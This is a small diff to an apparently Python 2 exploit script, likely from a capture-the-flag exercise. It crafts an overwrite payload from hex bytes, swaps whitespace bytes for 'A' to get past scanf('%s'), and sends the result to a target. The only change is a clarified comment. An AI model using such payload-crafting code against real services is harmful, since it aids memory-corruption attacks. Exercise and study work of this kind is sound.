@@ -108,7 +108,7 @@ for l in lines:
         e = unhexlify(d)
         if e == '\x09' or e == '\x0a' or e == '\x0b' or e == '\x0c' or e == '\x0d' or e == '\x20':
             print "[*] Found whitespace 0x%02X" % ord(e)
-            e = '\x41' # scanf("%s") stops at whitespaces
+            e = '\x41' # scanf("%s") stops at whitespaces. replace with 'A'.
         overwrites += e
 
 r.send(overwrites + '\n')
